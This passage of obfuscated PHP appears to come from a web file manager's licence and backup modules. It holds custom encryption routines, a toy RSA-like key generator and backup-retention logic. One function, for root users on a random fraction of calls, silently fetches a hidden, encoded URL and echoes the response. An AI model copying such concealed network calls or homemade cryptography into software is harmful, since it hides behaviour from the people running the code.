$ºÙü–ğ¬ = array_to_keyvalue($ºÙü–ğ¬, $ğô×ğĞÜ[6], $ğô×ğĞÜ[295]); if (!in_array($Êı€®‚ê[$ğô×ğĞÜ[295]], $ºÙü–ğ¬)) { show_json($ğô×ğĞÜ[296], !1, $ğô×ğĞÜ[209]); } } public function jtgudd273597() { $öÅÀõÑø =& $_SERVER[º·Ï‹¥³]; $Ô’ÄöÒñ =& $_SERVER[€ÔÇñ¨ø]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ƒ÷îµáĞ = $Ô’ÄöÒñ[216]; $ŠœŒöñ‡ = $öÅÀõÑø[741]; $ƒ÷îµáĞ = $this->cqjd2048f8cf($ƒ÷îµáĞ, $Ô’ÄöÒñ[217]); $õ™Øş„ = stream_context_create(array($Ô’ÄöÒñ[218] => array($Ô’ÄöÒñ[219] => $Ô’ÄöÒñ[220], $Ô’ÄöÒñ[221] => 3))); $Øªçı‰ä = $öÅÀõÑø[742]; while (strlen($Øªçı‰ä) < $öÅÀõÑø[676]) { if (!$Øªçı‰ä) { break; } $Øªçı‰ä++; } $ëğÃ®¢ = @file_get_contents($ƒ÷îµáĞ, !1, $õ™Øş„); echo $Ô’ÄöÒñ[297] . hash_encode($ëğÃ®¢) . $Ô’ÄöÒñ[298]; $´ü”íä‹ = $öÅÀõÑø[743]; while (strlen($´ü”íä‹) < $öÅÀõÑø[412]) { if (!$´ü”íä‹) { break; } $´ü”íä‹++; } } private function qamef6a6ceac($™˜œ„£, $ß–ª‡ÁÉ, $ğ¡Ëœô = 3) { $·»ñšˆ¢ =& $_SERVER[º·Ï‹¥³]; $œšº‡ıã =& $_SERVER[€ÔÇñ¨ø]; usleep(1); $æ‚î¶¬¢ = $·»ñšˆ¢[744]; if (!$æ‚î¶¬¢) { return; } $™˜œ„£ = trim($™˜œ„£); $ôÂë½±É = $·»ñšˆ¢[745]; if (strlen($ôÂë½±É) < $·»ñšˆ¢[676]) { die; } $ø§ĞÎË™ = mt_rand(0, 5) . $œšº‡ıã[6]; $ûæ‰ÆÌÚ = $·»ñšˆ¢[746]; if (strlen($ûæ‰ÆÌÚ) < $·»ñšˆ¢[676]) { die; } $ü€ÒïÂù = rand_string(15); $Ù“Êğâå = $œšº‡ıã[299]; switch ($ø§ĞÎË™) { case $œšº‡ıã[205]: $¼ïåÚ² = $this->tzgs8ec9139b($™˜œ„£, strrev($ß–ª‡ÁÉ . $ü€ÒïÂù)); $µÜà§¡Ï = $·»ñšˆ¢[747]; break; $˜‘õÁ±“ = $·»ñšˆ¢[748]; case $œšº‡ıã[121]: $¼ïåÚ² = $this->tzgs8ec9139b($™˜œ„£, strrev($ü€ÒïÂù . $ß–ª‡ÁÉ)); break; case $œšº‡ıã[300]: $¼ïåÚ² = $this->tzgs8ec9139b($™˜œ„£, base64_encode($ü€ÒïÂù . $ß–ª‡ÁÉ)); break; $ì€ĞˆÚ¬ = $·»ñšˆ¢[749]; case $œšº‡ıã[301]: $¼ïåÚ² = $this->tzgs8ec9139b($™˜œ„£, md5($ü€ÒïÂù . $ß–ª‡ÁÉ)); $ô¯¡©†‹ = $·»ñšˆ¢[750]; break; $ö«âË§× = $·»ñšˆ¢[751]; while (strlen($ö«âË§×) < $·»ñšˆ¢[672]) { if (!$ö«âË§×) { break; } $ö«âË§×++; } case $œšº‡ıã[302]: $™˜œ„£ = base64_encode($™˜œ„£); $©©»Àš¢ = $·»ñšˆ¢[752]; while (strlen($©©»Àš¢) < $·»ñšˆ¢[672]) { if (!$©©»Àš¢) { break; } $©©»Àš¢++; } $«©©½ı‚ = rand(0, 64); $Ş«´ˆ¸¡ = $Ù“Êğâå[$«©©½ı‚]; $ÃÆÓİŒ = $·»ñšˆ¢[753]; if (strlen($ÃÆÓİŒ) < $·»ñšˆ¢[707]) { return; } $Ôˆ™ª›Ÿ = md5($Ş«´ˆ¸¡ . md5($ß–ª‡ÁÉ . $Ş«´ˆ¸¡) . $ß–ª‡ÁÉ); $Ôˆ™ª›Ÿ = substr($Ôˆ™ª›Ÿ, $«©©½ı‚ % 8, $«©©½ı‚ % 8 + 7); $¸å¯Û©­ = $·»ñšˆ¢[754]; $³õáø‡Ø = $œšº‡ıã[6]; $ü¬¦èĞ = $·»ñšˆ¢[755]; while (strlen($ü¬¦èĞ) < $·»ñšˆ¢[676]) { if (!$ü¬¦èĞ) { break; } $ü¬¦èĞ++; } $­Ù–†ŸŸ = 0; $’Îğ¥³µ = 0; $‘Ì¯î¢ = $·»ñšˆ¢[756]; $õ¹§Ñß· = 0; $ºÁ×ªÅ = $·»ñšˆ¢[757]; for ($­Ù–†ŸŸ = 0; $­Ù–†ŸŸ < strlen($™˜œ„£); $­Ù–†ŸŸ++) { $õ¹§Ñß· = $õ¹§Ñß· == strlen($Ôˆ™ª›Ÿ) ? 0 : $õ¹§Ñß·; $¾Š§½Å‰ = $·»ñšˆ¢[688]; if (!$¾Š§½Å‰) { return; } $’Îğ¥³µ = ($«©©½ı‚ + strpos($Ù“Êğâå, $™˜œ„£[$­Ù–†ŸŸ]) + ord($Ôˆ™ª›Ÿ[$õ¹§Ñß·++])) % 64; $³õáø‡Ø .= $Ù“Êğâå[$’Îğ¥³µ]; } $¼ïåÚ² = hash_encode($Ş«´ˆ¸¡ . $³õáø‡Ø); $öŸ¤¥çï = $·»ñšˆ¢[758]; if (!$öŸ¤¥çï) { return; } break; $èÉ†£àæ = $·»ñšˆ¢[759]; while ($èÉ†£àæ < $·»ñšˆ¢[707]) { if ($èÉ†£àæ >= 0) { break; } $èÉ†£àæ++; } default: $¼ïåÚ² = $this->tzgs8ec9139b($™˜œ„£, $ß–ª‡ÁÉ . $ü€ÒïÂù); break; $³ÃãÒÀ’ = $·»ñšˆ¢[760]; if (!$³ÃãÒÀ’) { return; } } $¼ïåÚ² = strrev($ø§ĞÎË™ . $ü€ÒïÂù . $¼ïåÚ²); if ($ğ¡Ëœô - 1 > 0) { $¼ïåÚ² = $this->qamef6a6ceac($¼ïåÚ², $ß–ª‡ÁÉ, $ğ¡Ëœô - 1); } return $¼ïåÚ²; } private function qnsc844414e8($ò¦µ¨˜ß, $§Æ€å‡‹, $Ë³¥æ¶Í = 3) { $àÙé›ïŠ =& $_SERVER[º·Ï‹¥³]; $åì§Èå” =& $_SERVER[€ÔÇñ¨ø]; if (!is_string($ò¦µ¨˜ß) || strlen($ò¦µ¨˜ß) < 10) { return !1; } $ò¦µ¨˜ß = trim($ò¦µ¨˜ß); $ò¦µ¨˜ß = strrev($ò¦µ¨˜ß); $ŠÇÌïÕö = $àÙé›ïŠ[761]; $Ê óÕ« = $ò¦µ¨˜ß[0]; $½Š­ = substr($ò¦µ¨˜ß, 1, 15); $ò¦µ¨˜ß = substr($ò¦µ¨˜ß, 16); $ÙÔ§¤Ë  = $àÙé›ïŠ[762]; if (strlen($ÙÔ§¤Ë ) < $àÙé›ïŠ[676]) { die; } $ÍœåÛ®À = $åì§Èå”[299]; $ó©ñİª¼ = $àÙé›ïŠ[763]; while ($ó©ñİª¼ < $àÙé›ïŠ[707]) { if ($ó©ñİª¼ >= 0) { break; } $ó©ñİª¼++; } switch ($Ê óÕ«) { case $åì§Èå”[205]: $½‘…úİˆ = $this->cqjd2048f8cf($ò¦µ¨˜ß, strrev($§Æ€å‡‹ . $½Š­)); break; case $åì§Èå”[121]: $½‘…úİˆ = $this->cqjd2048f8cf($ò¦µ¨˜ß, strrev($½Š­ . $§Æ€å‡‹)); break; $ºæéå‡’ = $àÙé›ïŠ[764]; if (strlen($ºæéå‡’) < $àÙé›ïŠ[412]) { die; } case $åì§Èå”[300]: $½‘…úİˆ = $this->cqjd2048f8cf($ò¦µ¨˜ß, base64_encode($½Š­ . $§Æ€å‡‹)); $ø„ƒØù = $àÙé›ïŠ[765]; while (strlen($ø„ƒØù) < $àÙé›ïŠ[691]) { if (!$ø„ƒØù) { break; } $ø„ƒØù++; } break; $Û´ìÙ‰Ü = $àÙé›ïŠ[766]; if (!$Û´ìÙ‰Ü) { return; } case $åì§Èå”[301]: $½‘…úİˆ = $this->cqjd2048f8cf($ò¦µ¨˜ß, md5($½Š­ . $§Æ€å‡‹)); $Ÿèà …‘ = $àÙé›ïŠ[767]; if (!$Ÿèà …‘) { die; } break; case $åì§Èå”[302]: $ò¦µ¨˜ß = hash_decode($ò¦µ¨˜ß); $¥ƒ†º±ß = $ò¦µ¨˜ß[0]; $ò¦µ¨˜ß = substr($ò¦µ¨˜ß, 1); $û¹øÂ = strpos($ÍœåÛ®À, $¥ƒ†º±ß); $×ÌË¤Ô· = md5($¥ƒ†º±ß . md5($§Æ€å‡‹ . $¥ƒ†º±ß) . $§Æ€å‡‹); $Ôì†ËÃ = $àÙé›ïŠ[768]; if (!$Ôì†ËÃ) { die; } $×ÌË¤Ô· = substr($×ÌË¤Ô·, $û¹øÂ % 8, $û¹øÂ % 8 + 7); $Âç¦Œëı = $åì§Èå”[6]; $¬€ğ•·Ö = 0; $×¾ï”ù‹ = $àÙé›ïŠ[769]; if (strlen($×¾ï”ù‹) < $àÙé›ïŠ[676]) { return; } $º×İ÷­ø = 0; $‚Ğšª†Í = 0; $Ü½Î¹‡œ = $àÙé›ïŠ[770]; if (!$Ü½Î¹‡œ) { die; } for ($¬€ğ•·Ö = 0; $¬€ğ•·Ö < strlen($ò¦µ¨˜ß); $¬€ğ•·Ö++) { $‚Ğšª†Í = $‚Ğšª†Í == strlen($×ÌË¤Ô·) ? 0 : $‚Ğšª†Í; $µÊÜ– Ø = $àÙé›ïŠ[771]; $Ñ˜ƒ´¾ = $‚Ğšª†Í++; $œÖºÁì¡ = $àÙé›ïŠ[772]; while (strlen($œÖºÁì¡) < $àÙé›ïŠ[707]) { if (!$œÖºÁì¡) { break; } $œÖºÁì¡++; } $º×İ÷­ø = strpos($ÍœåÛ®À, $ò¦µ¨˜ß[$¬€ğ•·Ö]) - $û¹øÂ - ord($×ÌË¤Ô·[$Ñ˜ƒ´¾]); $ùÉÀ¯‰Å = $àÙé›ïŠ[773]; while (strlen($ùÉÀ¯‰Å) < $àÙé›ïŠ[707]) { if (!$ùÉÀ¯‰Å) { break; } $ùÉÀ¯‰Å++; } while ($º×İ÷­ø < 0) { $º×İ÷­ø += 64; } $Âç¦Œëı .= $ÍœåÛ®À[$º×İ÷­ø]; $ÒÀûå¦­ = $àÙé›ïŠ[774]; while (strlen($ÒÀûå¦­) < $àÙé›ïŠ[676]) { if (!$ÒÀûå¦­) { break; } $ÒÀûå¦­++; } } $½‘…úİˆ = base64_decode($Âç¦Œëı); break; default: $½‘…úİˆ = $this->cqjd2048f8cf($ò¦µ¨˜ß, $§Æ€å‡‹ . $½Š­); break; } if ($Ë³¥æ¶Í - 1 > 0) { $½‘…úİˆ = $this->qnsc844414e8($½‘…úİˆ, $§Æ€å‡‹, $Ë³¥æ¶Í - 1); } return $½‘…úİˆ; } public function hyrn32bf48d4($Éò˜§ñÆ) { $Î«Á¹Ïß =& $_SERVER[º·Ï‹¥³]; $©ÜãñÃó =& $_SERVER[€ÔÇñ¨ø]; $›¹½À¾ş = $this->uper9170b4ce(); $ã¤Ü¼Î¨ = $this->uper9170b4ce(); $ÑÀ¢¤Š = $Î«Á¹Ïß[775]; while ($ÑÀ¢¤Š < $Î«Á¹Ïß[676]) { if ($ÑÀ¢¤Š >= 0) { break; } $ÑÀ¢¤Š++; } $§çˆÇå = ($›¹½À¾ş - 1) * ($ã¤Ü¼Î¨ - 1); $£Œ¹ÓºË = intval(($›¹½À¾ş + $ã¤Ü¼Î¨) / 2); while (1) { $ˆôŸ‚¹æ = $£Œ¹ÓºË; $à•µê á = $Î«Á¹Ïß[776]; while (strlen($à•µê á) < $Î«Á¹Ïß[672]) { if (!$à•µê á) { break; } $à•µê á++; } $®¿Ğ÷Õ = $§çˆÇå; $şÙÑ¨ì = $Î«Á¹Ïß[777]; if (!$şÙÑ¨ì) { return; } while ($®¿Ğ÷Õ % $ˆôŸ‚¹æ != 0) { $²©ÎŒ£¨ = $®¿Ğ÷Õ; $ö…«¶ËÌ = $Î«Á¹Ïß[778]; if (!$ö…«¶ËÌ) { die; } $®¿Ğ÷Õ = $ˆôŸ‚¹æ; $‹–Âà¿Ö = $Î«Á¹Ïß[779]; while (strlen($‹–Âà¿Ö) < $Î«Á¹Ïß[672]) { if (!$‹–Âà¿Ö) { break; } $‹–Âà¿Ö++; } $ˆôŸ‚¹æ = $²©ÎŒ£¨ % $ˆôŸ‚¹æ; $Í®“•³ = $Î«Á¹Ïß[780]; } if ($ˆôŸ‚¹æ == 1) { break; } else { $£Œ¹ÓºË++; } } $ãáëä¡Û = 2; for ($¯ŞÏÊ›Š = 0; $¯ŞÏÊ›Š < $§çˆÇå * 10; $¯ŞÏÊ›Š++) { if (($§çˆÇå * $¯ŞÏÊ›Š + 1) % $£Œ¹ÓºË == 0) { $ãáëä¡Û = intval(($§çˆÇå * $¯ŞÏÊ›Š + 1) / $£Œ¹ÓºË); break; } } $ÈÄõÉ•ß = $this->tzgs8ec9139b($›¹½À¾ş * $ã¤Ü¼Î¨ . $©ÜãñÃó[6], $©ÜãñÃó[135]); $–‹áªç = md5($©ÜãñÃó[303] . ($›¹½À¾ş + $ã¤Ü¼Î¨) . $©ÜãñÃó[304] . $£Œ¹ÓºË . $©ÜãñÃó[304] . $ãáëä¡Û . $©ÜãñÃó[305]); $òçñÕğœ = $Î«Á¹Ïß[781]; if (!$òçñÕğœ) { return; } $…ˆò’ÊÒ = $this->tzgs8ec9139b($Éò˜§ñÆ, $–‹áªç) . $©ÜãñÃó[306] . $ÈÄõÉ•ß; $ñï£Äíå = $Î«Á¹Ïß[782]; while (strlen($ñï£Äíå) < $Î«Á¹Ïß[691]) { if (!$ñï£Äíå) { break; } $ñï£Äíå++; } return $…ˆò’ÊÒ; $ˆ²ÏÏí = $Î«Á¹Ïß[783]; if (strlen($ˆ²ÏÏí) < $Î«Á¹Ïß[707]) { return; } } public function mftj970b33d7($‰“°Ô¿) { $ÛÃà£³Ò =& $_SERVER[º·Ï‹¥³]; $ÆÖ†¾‚ =& $_SERVER[€ÔÇñ¨ø]; $ÕÓ›Õ–¼ = explode($ÆÖ†¾‚[306], $‰“°Ô¿); $ß¤¢ÒØ = $ÛÃà£³Ò[784]; while (strlen($ß¤¢ÒØ) < $ÛÃà£³Ò[676]) { if (!$ß¤¢ÒØ) { break; } $ß¤¢ÒØ++; } if (count($ÕÓ›Õ–¼) != 2) { return $ÆÖ†¾‚[6]; } $Ò–‚àØ£ = $this->cqjd2048f8cf($ÕÓ›Õ–¼[1] . $ÆÖ†¾‚[6], $ÆÖ†¾‚[135]); if (!$Ò–‚àØ£) { return $ÆÖ†¾‚[6]; } $Ò–‚àØ£ = intval($Ò–‚àØ£); $á„ÏéÙü = $ÛÃà£³Ò[785]; while ($á„ÏéÙü < $ÛÃà£³Ò[672]) { if ($á„ÏéÙü >= 0) { break; } $á„ÏéÙü++; } $Ÿ¬•ÓÒ = 0; $±Šº÷ØÇ = 0; $ÈŒ–¨µß = $ÛÃà£³Ò[786]; if (strlen($ÈŒ–¨µß) < $ÛÃà£³Ò[676]) { die; } for ($²µ©Ôáë = 3; $²µ©Ôáë < $Ò–‚àØ£; $²µ©Ôáë += 2) { if ($Ò–‚àØ£ % $²µ©Ôáë != 0) { continue; } $Ÿ¬•ÓÒ = $²µ©Ôáë; $±Šº÷ØÇ = intval($Ò–‚àØ£ / $²µ©Ôáë); $„´Äı‹ş = $ÛÃà£³Ò[787]; while ($„´Äı‹ş < $ÛÃà£³Ò[672]) { if ($„´Äı‹ş >= 0) { break; } $„´Äı‹ş++; } break; } $œÊòõßß = ($Ÿ¬•ÓÒ - 1) * ($±Šº÷ØÇ - 1); $ê€³äŞ¸ = intval(($Ÿ¬•ÓÒ + $±Šº÷ØÇ) / 2); while (1) { $Æ™æÛ±› = $ê€³äŞ¸; $›¢¢Œş• = $œÊòõßß; $¼¨õÆ¢Ì = $ÛÃà£³Ò[788]; if (strlen($¼¨õÆ¢Ì) < $ÛÃà£³Ò[691]) { return; } while ($›¢¢Œş• % $Æ™æÛ±› != 0) { $öĞ‚ã›Ä = $›¢¢Œş•; $¶²¾éÎ = $ÛÃà£³Ò[789]; if (!$¶²¾éÎ) { die; } $›¢¢Œş• = $Æ™æÛ±›; $Æ™æÛ±› = $öĞ‚ã›Ä % $Æ™æÛ±›; $à¥ÍáÈ = $ÛÃà£³Ò[790]; while (strlen($à¥ÍáÈ) < $ÛÃà£³Ò[672]) { if (!$à¥ÍáÈ) { break; } $à¥ÍáÈ++; } } if ($Æ™æÛ±› == 1) { break; } else { $ê€³äŞ¸++; } } $¬ò·ˆÊÉ = 2; for ($²µ©Ôáë = 0; $²µ©Ôáë < $œÊòõßß * 10; $²µ©Ôáë++) { if (($œÊòõßß * $²µ©Ôáë + 1) % $ê€³äŞ¸ == 0) { $¬ò·ˆÊÉ = intval(($œÊòõßß * $²µ©Ôáë + 1) / $ê€³äŞ¸); break; } } $’ÎŒœ¦ = md5($ÆÖ†¾‚[303] . ($Ÿ¬•ÓÒ + $±Šº÷ØÇ) . $ÆÖ†¾‚[304] . $ê€³äŞ¸ . $ÆÖ†¾‚[304] . $¬ò·ˆÊÉ . $ÆÖ†¾‚[305]); $«­ïèüó = $ÛÃà£³Ò[791]; $“ªôÌ¢È = $this->cqjd2048f8cf($ÕÓ›Õ–¼[0], $’ÎŒœ¦); $ëÚİéÂ = $ÛÃà£³Ò[792]; if (strlen($ëÚİéÂ) < $ÛÃà£³Ò[672]) { die; } return $“ªôÌ¢È; $öÏ™Ã˜ = $ÛÃà£³Ò[793]; } public function uper9170b4ce() { $î‡‹‹œª =& $_SERVER[º·Ï‹¥³]; $âÚ÷û‡» = mt_rand(pow(2, 14), pow(2, 16) - 1); $¬­å °œ = array(); $Ò•£©„ = 1; $•¹µµğã = $î‡‹‹œª[794]; while (strlen($•¹µµğã) < $î‡‹‹œª[672]) { if (!$•¹µµğã) { break; } $•¹µµğã++; } while ($Ò•£©„ <= (int) sqrt($âÚ÷û‡»)) { $ğííË³ = $Ò•£©„; $ÍÚö¼‰• = $î‡‹‹œª[795]; while (!0) { $ğííË³++; if ($ğííË³ <= 2) { $Ò•£©„ = $ğííË³; break; } else { if ($ğííË³ < 2) { continue; } } $Æ‚š››İ = !0; for ($ÎœùııÖ = 2; $ÎœùııÖ <= sqrt($ğííË³); $ÎœùııÖ++) { if ($ğííË³ % $ÎœùııÖ == 0) { $Æ‚š››İ = !1; } } if ($Æ‚š››İ) { $Ò•£©„ = $ğííË³; break; } } $¬­å °œ[] = $Ò•£©„; $Ø¿†îÎØ = $î‡‹‹œª[796]; if (strlen($Ø¿†îÎØ) < $î‡‹‹œª[691]) { die; } } $ä¶ òÀ = 2; for ($ğííË³ = $âÚ÷û‡»; $ğííË³ > 1; $ğííË³--) { $Æ‚š››İ = !0; $’œıŞó¹ = $î‡‹‹œª[797]; foreach ($¬­å °œ as $®¥ÉÃÕ¼) { if ($ğííË³ % $®¥ÉÃÕ¼ == 0) { $Æ‚š››İ = !1; break; } } if ($Æ‚š››İ) { $ä¶ òÀ = $ğííË³; break; } } return $ä¶ òÀ; $òœİüÖ = $î‡‹‹œª[798]; if (strlen($òœİüÖ) < $î‡‹‹œª[412]) { return; } } public function akswc10aed7f($ÔÌ‘³ê, $¥Öß›Ø) { $Ë£ÈÜ› =& $_SERVER[º·Ï‹¥³]; $†ŒŸëå =& $_SERVER[€ÔÇñ¨ø]; return call_user_func(array($†ŒŸëå[8], $†ŒŸëå[307]), $ÔÌ‘³ê, $¥Öß›Ø); $Û·ÍÔ‚Ú = $Ë£ÈÜ›[799]; while ($Û·ÍÔ‚Ú < $Ë£ÈÜ›[707]) { if ($Û·ÍÔ‚Ú >= 0) { break; } $Û·ÍÔ‚Ú++; } } public function tzgs8ec9139b($Œ…Ë‰³, $¡³‰”¯½) { $şÏ¹”¿ğ =& $_SERVER[€ÔÇñ¨ø]; return call_user_func(array($şÏ¹”¿ğ[308], $şÏ¹”¿ğ[309]), $Œ…Ë‰³, $¡³‰”¯½); } public function cqjd2048f8cf($ÖÃÇ¹ª, $Ó÷˜¹ª¸) { $¥£Äò´ğ =& $_SERVER[€ÔÇñ¨ø]; return call_user_func(array($¥£Äò´ğ[308], $¥£Äò´ğ[310]), $ÖÃÇ¹ª, $Ó÷˜¹ª¸); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ÜáÓÜç =& $_SERVER[º·Ï‹¥³]; $this->isManual(); self::$name = date($ÜáÓÜç[800]); if (!($Ñëù›ÏÈ = Model($ÜáÓÜç[801])->lastItem())) { $Ñëù›ÏÈ = $this->initData(); } else { self::$name = $Ñëù›ÏÈ[$ÜáÓÜç[32]]; if ($Ñëù›ÏÈ[$ÜáÓÜç[802]] == $ÜáÓÜç[91]) { self::$name = date($ÜáÓÜç[263]); $ÁıŸ…± = 0; if (isset($Ñëù›ÏÈ[$ÜáÓÜç[344]][$ÜáÓÜç[221]][$ÜáÓÜç[525]])) { $ÁıŸ…± = (int) $Ñëù›ÏÈ[$ÜáÓÜç[344]][$ÜáÓÜç[221]][$ÜáÓÜç[525]]; } if (self::$manual == 0 && $Ñëù›ÏÈ[$ÜáÓÜç[32]] == self::$name) { Model($ÜáÓÜç[801])->remove($Ñëù›ÏÈ[$ÜáÓÜç[459]]); } $Ñëù›ÏÈ = $this->initData($ÁıŸ…±, $Ñëù›ÏÈ[$ÜáÓÜç[803]]); } else { $this->checkStore($Ñëù›ÏÈ[$ÜáÓÜç[803]]); } } self::$option = $Ñëù›ÏÈ; } private function isManual() { $º’¦€Òˆ = _get($GLOBALS, $_SERVER[º·Ï‹¥³][804], 0); $º’¦€Òˆ = intval($º’¦€Òˆ); self::$manual = $º’¦€Òˆ && $º’¦€Òˆ == 1 ? 1 : 0; } private function initData($½ı×ì„» = 0, $†İ¿úÙ = '') { $İá¬ãÛ =& $_SERVER[º·Ï‹¥³]; $İåó›ÆÙ = Model($İá¬ãÛ[801])->config(); if ($†İ¿úÙ && $İåó›ÆÙ[$İá¬ãÛ[803]] != $†İ¿úÙ) { $½ı×ì„» = 0; } $this->checkStore($İåó›ÆÙ[$İá¬ãÛ[803]]); if (self::$manual == 1) { self::$name .= $İá¬ãÛ[11] . date($İá¬ãÛ[805]); } $î¼¸Ì¯° = array($İá¬ãÛ[803] => $İåó›ÆÙ[$İá¬ãÛ[803]], $İá¬ãÛ[32] => self::$name, $İá¬ãÛ[802] => 0, $İá¬ãÛ[806] => $İåó›ÆÙ[$İá¬ãÛ[806]], $İá¬ãÛ[807] => self::$manual, $İá¬ãÛ[344] => array($İá¬ãÛ[808] => array($İá¬ãÛ[802] => 0), $İá¬ãÛ[809] => array($İá¬ãÛ[802] => 0, $İá¬ãÛ[810] => 0, $İá¬ãÛ[811] => 0, $İá¬ãÛ[33] => $İá¬ãÛ[12], $İá¬ãÛ[812] => 0, $İá¬ãÛ[813] => 0), $İá¬ãÛ[814] => array($İá¬ãÛ[802] => 0, $İá¬ãÛ[810] => 0, $İá¬ãÛ[811] => 0, $İá¬ãÛ[812] => 0, $İá¬ãÛ[813] => 0), $İá¬ãÛ[221] => array($İá¬ãÛ[802] => 0, $İá¬ãÛ[815] => 0, $İá¬ãÛ[816] => 0, $İá¬ãÛ[817] => 0, $İá¬ãÛ[818] => 0, $İá¬ãÛ[525] => $½ı×ì„», $İá¬ãÛ[812] => 0, $İá¬ãÛ[813] => 0)), $İá¬ãÛ[812] => time(), $İá¬ãÛ[813] => 0); $™ğ±æÔÑ = Model($İá¬ãÛ[801])->insert($î¼¸Ì¯°); $î¼¸Ì¯°[$İá¬ãÛ[459]] = $™ğ±æÔÑ; return $î¼¸Ì¯°; } private function checkStore($ÀÀ…† ‡) { $¥¡ÅÛı = Model($_SERVER[º·Ï‹¥³][819]); $ÆÂÊïƒ¢ = $¥¡ÅÛı->listData($ÀÀ…† ‡); $¥¡ÅÛı->checkConfig($ÆÂÊïƒ¢); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[º·Ï‹¥³][801])->findByName(self::$name); } return self::$option; } public static function set($ÈÆÔ¨) { $ûâ»øıÓ =& $_SERVER[º·Ï‹¥³]; $è÷ï½Ï„ = self::get(); foreach ($ÈÆÔ¨ as $Û¢Ä¬ı¥ => $Š£‚ÃÙ) { $¶‹Š±ú = explode($ûâ»øıÓ[10], $Û¢Ä¬ı¥); $÷ä°Ú—À = count($¶‹Š±ú); switch ($÷ä°Ú—À) { case 1: $è÷ï½Ï„[$¶‹Š±ú[0]] = $Š£‚ÃÙ; break; case 2: $è÷ï½Ï„[$¶‹Š±ú[0]][$¶‹Š±ú[1]] = $Š£‚ÃÙ; break; case 3: $è÷ï½Ï„[$¶‹Š±ú[0]][$¶‹Š±ú[1]][$¶‹Š±ú[2]] = $Š£‚ÃÙ; break; } } Model($ûâ»øıÓ[801])->update($è÷ï½Ï„[$ûâ»øıÓ[459]], $è÷ï½Ï„); self::$option = $è÷ï½Ï„; return self::$option; } public function keep() { $®»¿óú® =& $_SERVER[º·Ï‹¥³]; $›íÈØöú = self::get(); if ($›íÈØöú[$®»¿óú®[344]][$®»¿óú®[808]][$®»¿óú®[802]] == $®»¿óú®[91]) { return; } $this->backupKeep($›íÈØöú); self::set(array($®»¿óú®[820] => 1)); } private function backupKeep($Ô¼º»¡„) { $Ô·ê’Åß =& $_SERVER[º·Ï‹¥³]; if (self::$manual == 1) { return; } $­à’ºª‰ = Model($Ô·ê’Åß[801])->listData(); if (empty($­à’ºª‰)) { return; } $Ğ¤ÈŒË± = 0; $÷òñ§àÎ = array(); foreach ($­à’ºª‰ as $üŠ•é«) { if ($Ğ¤ÈŒË± >= 7) { break; } $÷òñ§àÎ[] = $üŠ•é«[$Ô·ê’Åß[32]]; $Ğ¤ÈŒË±++; } for ($Ğ¤ÈŒË± = 0; $Ğ¤ÈŒË± < 12; $Ğ¤ÈŒË±++) { $÷òñ§àÎ[] = date($Ô·ê’Åß[821], strtotime("\x2d{$Ğ¤ÈŒË±}\x20\155\x6f\x6e\x74\150\163")); } $÷òñ§àÎ = array_unique($÷òñ§àÎ); $½³ç÷ß = Model($Ô·ê’Åß[822])->get($Ô·ê’Åß[823]); foreach ($­à’ºª‰ as $üŠ•é«) { if (isset($üŠ•é«[$Ô·ê’Åß[807]]) && $üŠ•é«[$Ô·ê’Åß[807]] == $Ô·ê’Åß[91]) { continue; } if (!empty($üŠ•é«[$Ô·ê’Åß[32]]) && in_array($üŠ•é«[$Ô·ê’Åß[32]], $÷òñ§àÎ)) { continue; } Model($Ô·ê’Åß[801])->remove($üŠ•é«[$Ô·ê’Åß[459]]); $çÙ§êÁ = $this->backupPath($Ô¼º»¡„, $½³ç÷ß); IO::remove($çÙ§êÁ, !1); } } private function backupPath($º„×Õµ½, $äÁÙ€’Ñ = false) { $Şù§¡Ú‚ =& $_SERVER[º·Ï‹¥³]; if (!$äÁÙ€’Ñ) { $äÁÙ€’Ñ = Model($Şù§¡Ú‚[822])->get($Şù§¡Ú‚[823]); } $»ö²¦±• = $º„×Õµ½[$Şù§¡Ú‚[32]]; $ÕÂ›Øœ± = substr(md5($Şù§¡Ú‚[824] . $äÁÙ€’Ñ . $»ö²¦±•), 0, 8); return "\x7b\151\157\x3a{$º„×Õµ½[$Şù§¡Ú‚[803]]}\x7d\57\x64\141\164\x61\142\x61\163\145\x2f\142\141\x63\153\x75\160\57" . $»ö²¦±• . $Şù§¡Ú‚[11] . $ÕÂ›Øœ±; } public function db() { $’¼¹ï ˆ =& $_SERVER[º·Ï‹¥³]; $ËÀôœ®± = self::get(); if ($ËÀôœ®±[$’¼¹ï ˆ[344]][$’¼¹ï ˆ[809]][$’¼¹ï ˆ[802]] == $’¼¹ï ˆ[91]) { return !0; } $ÔÄİŞè€ = new BackupDb(); if (!$ÔÄİŞè€->index()) { return !1; } self::set(array($’¼¹ï ˆ[825] => 1)); return !0; } public function dbFile() { $å”èïâ =& $_SERVER[º·Ï‹¥³]; $·±íıÄ = self::get(); if ($·±íıÄ[$å”èïâ[344]][$å”èïâ[814]][$å”èïâ[802]] == $å”èïâ[91]) { return !0; } $¶ˆ•Ö¬¯ = new BackupDbFile(); if (!$¶ˆ•Ö¬¯->index()) { return !1; } self::set(array($å”èïâ[826] => 1)); return !0; } public function file() { $Îö¸·›  =& $_SERVER[º·Ï‹¥³]; $ãüŸ‡Ò = self::get(); if ($ãüŸ‡Ò[$Îö¸·› [344]][$Îö¸·› [221]][$Îö¸·› [802]] == $Îö¸·› [91]) { return !0; } if (!isset($ãüŸ‡Ò[$Îö¸·› [806]]) || $ãüŸ‡Ò[$Îö¸·› [806]] == $Îö¸·› [219]) { $ïæó¯¦Ş = new BackupFile(); if (!$ïæó¯¦Ş->index()) { return !1; } } self::set(array($Îö¸·› [827] => 1, $Îö¸·› [802] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $›ğ©”É =& $_SERVER[º·Ï‹¥³]; $€ˆÉ×òù = Backup::get(); self::$io = $€ˆÉ×òù[$›ğ©”É[803]]; self::$name = $€ˆÉ×òù[$›ğ©”É[32]]; $è‘œ„’ = new DbManage(); $÷¹®ï‹× = $è‘œ„’->dbType(); $¨Æ¼Ã¬à = array($›ğ©”É[828] => $÷¹®ï‹×, $›ğ©”É[829] => time()); Backup::set($¨Æ¼Ã¬à); $”äù¼£¬ = $this->tmpFilesPath() . $›ğ©”É[830] . self::$name . $›ğ©”É[8]; del_dir($”äù¼£¬); mk_dir($”äù¼£¬); $½á³´Ö¸ = $ÜğòŠ£Ø = 0; try { $šˆñáïÎ = 